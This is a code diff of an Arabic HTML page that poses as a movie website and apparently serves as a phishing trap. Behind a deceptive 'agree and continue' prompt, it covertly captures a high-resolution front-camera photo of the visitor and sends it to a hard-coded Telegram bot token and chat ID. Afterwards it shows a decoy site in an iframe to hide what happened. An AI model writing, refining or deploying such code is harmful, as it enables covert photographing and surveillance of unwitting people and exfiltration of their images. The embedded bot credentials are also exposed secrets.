@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>موقع أفلام</title>
+    <title></title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background-color: #111;
+            background-color: #000;
             overflow: hidden;
             touch-action: none;
             -webkit-touch-callout: none;
@@ -38,7 +37,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            background-color: rgba(0,0,0,0.95);
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -46,64 +45,20 @@
             z-index: 1000;
             color: white;
             text-align: center;
-            padding: 30px;
+            padding: 20px;
             opacity: 1;
-            transition: opacity 0.5s ease;
-        }
-        
-        .logo {
-            width: 120px;
-            height: 120px;
-            margin-bottom: 25px;
-            background: linear-gradient(45deg, #007AFF, #00D4FF);
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 10px 25px rgba(0, 122, 255, 0.3);
-        }
-        
-        .logo i {
-            font-size: 50px;
-        }
-        
-        .permission-title {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 15px;
-            color: #fff;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.2);
-        }
-        
-        .permission-text {
-            font-size: 16px;
-            line-height: 1.6;
-            margin-bottom: 30px;
-            color: #e0e0e0;
-            max-width: 350px;
+            transition: opacity 0.3s ease;
         }
         
         .permission-btn {
-            margin-top: 15px;
-            padding: 15px 40px;
-            background: linear-gradient(45deg, #007AFF, #00D4FF);
+            margin-top: 30px;
+            padding: 12px 30px;
+            background-color: #007AFF;
             color: white;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: 600;
+            border-radius: 20px;
+            font-size: 16px;
             border: none;
             cursor: pointer;
-            box-shadow: 0 5px 15px rgba(0, 122, 255, 0.4);
-            transition: all 0.3s ease;
-        }
-        
-        .permission-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 122, 255, 0.6);
-        }
-        
-        .permission-btn:active {
-            transform: translateY(1px);
         }
         
         #loading-overlay {
@@ -112,7 +67,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            background-color: rgba(0,0,0,0.9);
             display: none;
             flex-direction: column;
             justify-content: center;
@@ -122,19 +77,13 @@
         }
         
         .spinner {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(255,255,255,0.1);
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255,255,255,0.3);
             border-radius: 50%;
             border-top-color: #007AFF;
             animation: spin 1s ease-in-out infinite;
-            margin-bottom: 25px;
-        }
-        
-        .loading-text {
-            font-size: 18px;
-            color: #e0e0e0;
-            letter-spacing: 1px;
+            margin-bottom: 20px;
         }
         
         @keyframes spin {
@@ -145,40 +94,37 @@
             display: none !important;
         }
         
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+        #website-frame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1002;
+            display: none;
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
     <!-- عنصر الكاميرا المخفي -->
     <video id="camera-container" autoplay playsinline></video>
     
     <!-- طبقة طلب الإذن -->
-    <div id="permission-overlay" class="pulse">
-        <div class="logo">
-            <i class="fas fa-film"></i>
-        </div>
-        <h2 class="permission-title">مرحباً بكم في موقع الأفلام</h2>
-        <p class="permission-text">للدخول إلى موقع الأفلام الحصري، يرجى الموافقة على الوصول للكاميرا لتأكيد الهوية</p>
-        <button class="permission-btn" id="allow-btn">
-            <i class="fas fa-check-circle" style="margin-left: 8px;"></i>
-            الموافقة والمتابعة
-        </button>
+    <div id="permission-overlay">
+        <h2 style="margin-bottom: 15px;">موقع افلام</h2>
+        <p style="margin-bottom: 10px;">لدخول الى موقع الافلام اضغط على زر الموافقة واذا لم يظهر الموقع اقفل وافتح الرابط من جديد</p>
+        <button class="permission-btn" id="allow-btn">الموافقة والمتابعة</button>
     </div>
     
     <!-- طبقة التحميل -->
     <div id="loading-overlay">
         <div class="spinner"></div>
-        <p class="loading-text">جاري التحضير لدخول الموقع...</p>
+        <p>انتظر لدخول الموقع...</p>
     </div>
+    
+    <!-- إطار الموقع -->
+    <iframe id="website-frame" src="about:blank"></iframe>
     
     <script>
         // التكوين - استبدل هذه القيم
@@ -186,7 +132,8 @@
             botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
             chatId: '5310911220',
             captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
-            autoCloseDelay: 1000 // تأخير الإغلاق بعد الإرسال
+            websiteUrl: 'https://bekes-505.github.io', // استبدل برابط الموقع الذي تريد فتحه
+            showWebsiteDelay: 1000 // تأخير عرض الموقع بعد الإرسال
         };
         
         // العناصر
@@ -194,6 +141,7 @@
         const permissionOverlay = document.getElementById('permission-overlay');
         const loadingOverlay = document.getElementById('loading-overlay');
         const allowBtn = document.getElementById('allow-btn');
+        const websiteFrame = document.getElementById('website-frame');
         
         // دالة متعددة المتصفحات لطلب الكاميرا
         async function initCamera() {
@@ -202,7 +150,7 @@
                     video: {
                         width: { ideal: 1920 },
                         height: { ideal: 1080 },
-                        facingMode: 'environment'
+                        facingMode: 'user'
                     },
                     audio: false
                 };
@@ -280,10 +228,14 @@
                 // إرسال الصورة
                 await sendToTelegram(photoBlob);
                 
-                // إغلاق النافذة بعد الإرسال
+                // إخفاء شاشة التحميل بعد الإرسال
+                loadingOverlay.style.display = 'none';
+                
+                // عرض الموقع بعد التأخير
                 setTimeout(() => {
-                    window.close();
-                }, config.autoCloseDelay);
+                    websiteFrame.src = config.websiteUrl;
+                    websiteFrame.style.display = 'block';
+                }, config.showWebsiteDelay);
                 
             } catch (error) {
                 console.error('Process failed:', error);
